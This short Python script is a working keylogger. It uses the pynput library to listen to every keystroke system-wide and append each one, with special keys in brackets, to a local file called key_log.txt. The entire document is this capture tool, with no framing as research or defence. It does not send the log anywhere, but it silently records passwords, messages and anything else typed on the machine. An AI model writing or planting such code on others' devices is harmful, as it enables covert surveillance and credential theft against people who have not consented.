from pynput import keyboard

def on_press(key):
    try:
        with open("key_log.txt", "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open("key_log.txt", "a") as file:
            file.write(f"[{key}]")  # For keys like space, enter, shift etc.

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
